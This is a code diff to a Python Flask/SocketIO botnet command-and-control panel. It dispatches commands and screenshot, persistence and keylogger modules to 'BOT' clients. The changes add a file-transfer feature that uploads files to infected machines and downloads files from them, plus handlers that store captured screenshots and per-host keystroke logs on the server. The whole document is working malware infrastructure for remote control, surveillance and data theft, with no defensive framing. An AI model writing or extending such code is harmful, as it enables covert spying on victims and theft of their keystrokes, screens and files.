@@ -2,6 +2,7 @@
 
 from flask import Flask, request, render_template, redirect, url_for, session, jsonify
 from flask_socketio import SocketIO, emit
+import os
 
 app = Flask(__name__)
 server = SocketIO(app)
@@ -9,11 +10,14 @@ app.secret_key = 'Fixer'
 
 USERNAME = 'admin'
 PASSWORD = 'admin9876'
+server_ip = '0.0.0.0'
+server_port = 8000
 idNumber = 0
 database = []
 completedTasks = []
 command_output = 'COMMAND OUTPUT'
 ping_output_list = []
+file_transfer_list = []
 screenshotNumber = 0
 keyloggerNumber = 0
 
@@ -61,26 +65,24 @@ def dashboard():
 
 @app.route('/modules', methods=['GET', 'POST'])
 def modules():
-    if session.get('loggedin'):
-        commandStatus = None
-        if request.method == 'POST':
-            idNumber = request.form.get('idNumber')
-            command = request.form.get('command')
-            hostname = None
+    if not session.get('loggedin'):
+        return redirect(url_for('login'))
+    if request.method == 'POST':
+        idNumber = request.form.get('idNumber')
+        command = request.form.get('command')
 
-            if idNumber:
-                client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
-                if client_info:
-                    hostname = client_info.hostname
-                else:
-                    return "ERROR: BOT with Provided BOT-ID not Found"
-                send_modules(idNumber, command, hostname)
-                return render_template('modules.html', taskDb=completedTasks, commandStatus=commandStatus)
+        if idNumber:
+            client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
+            if client_info:
+                hostname = client_info.hostname
             else:
-                return "ERROR : Bot ID not provided"
+                return "ERROR: BOT with Provided BOT-ID not Found"
+            send_modules(idNumber, command, hostname)
+            return render_template('modules.html', tasks=completedTasks)
+        else:
+            return "ERROR : Bot ID not provided"
 
-        return render_template('modules.html', taskDb=completedTasks, commandStatus=commandStatus)
-    return redirect(url_for('login'))
+    return render_template('modules.html', tasks=completedTasks)
 
 def send_modules(idNumber, command, hostname):
     if command not in ['screenshot', 'persistence', 'keylogger']:
@@ -113,7 +115,7 @@ def commands():
         else:
             return jsonify({'ERROR': 'BOT with provided BOT-ID not found'}), 404
     else:
-        return render_template('commands.html', commands_output="Please Send a Command First")
+        return render_template('commands.html', commands_output='')
 
 def send_commands(idNumber, command, hostname):
     client = next((c for c in database if c.idNumber == int(idNumber)), None)
@@ -152,6 +154,76 @@ def handle_ping_output(ping_output):
         hostname = client_info.hostname
         ping_output_list.append({'idNumber': idNumber, 'hostname': hostname, 'output': output})
 
+@app.route('/file_transfer', methods=['GET'])
+def file_transfer():
+    if not session.get('loggedin'):
+        return redirect(url_for('login'))
+    
+    transfer_type = request.args.get('transferType')
+    idNumber = request.args.get('idNumber')
+    file_name = request.args.get('fileName')
+    if idNumber is not None:
+        client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
+        if client_info:
+            hostname = client_info.hostname
+    if transfer_type == 'upload':
+        with open(f'{file_name}', 'rb') as file:
+            file_data = file.read()
+            server.emit('upload', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})
+        return render_template('file_transfer.html', transfer=file_transfer_list)
+    elif transfer_type == 'download':
+        server.emit('download', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name})
+        return render_template('file_transfer.html', transfer=file_transfer_list)
+    return render_template('file_transfer.html', transfer=file_transfer_list)
+
+@server.on('file_status')
+def file_status_update(file_status):
+    idNumber = file_status.get('idNumber')
+    transfer_type = file_status.get('transfer_type')
+    hostname = file_status.get('hostname')
+    file_name = file_status.get('file_name')
+    status = file_status.get('status')
+    file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
+
+@server.on('download_client')
+def file_status_update(input):
+    idNumber = input.get('idNumber')
+    transfer_type = input.get('transfer_type')
+    hostname = input.get('hostname')
+    file_name = input.get('file_name')
+    file_data = input.get('file_data')
+    file_path = "./Data/Files/" + file_name
+    if transfer_type == 'download':
+        try:
+            with open(file_path, 'wb') as file:
+                file.write(file_data)
+                status = "File Has Been Downloaded SuccessFully from Client"
+                file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
+        except:
+            status = "File Could not be Written on the Server"
+            file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
+
+@server.on('module_file')
+def module_file_transfer(input):
+    command = input.get('command')
+    file_name = input.get('file_name')
+    file_data = input.get('file_data')
+    if command == 'screenshot':
+        file_path = "./Data/Screenshots/" + file_name
+        with open(file_path, 'wb') as file:
+            file.write(file_data)
+
+@server.on('keylogs')
+def keylogs_saver(input):
+    hostname = input.get('hostname')
+    key = input.get('key')
+    filename = f"./Data/Keylogs/{hostname}_keylogs.txt"
+    if not os.path.exists(filename):
+        open(filename, 'a+').close()
+    if key is not None:
+        with open(filename, 'a') as logkey:
+            logkey.write(key)
+
 @app.route('/logout')
 def logout():
     session.clear()
@@ -159,7 +231,11 @@ def logout():
 
 @server.on('connect')
 def onConnect():
-    pass
+    print(f'CLIENT {idNumber} JUST CONNECTED TO THE SERVER 🟩')
+
+@server.on('disconnect')
+def onDisconnect():
+    print(f'CLIENT {idNumber} DISCONNECTED FROM THE SERVER 🟥')
 
 @server.on('Initial_Information')
 def handleInformation(Initial_Information):
@@ -199,4 +275,4 @@ def handleMessage(message):
     emit('message', message, broadcast=True)
 
 if __name__ == '__main__':
-    server.run(app, host='0.0.0.0', port=5000)
+    server.run(app, host=server_ip, port=server_port)
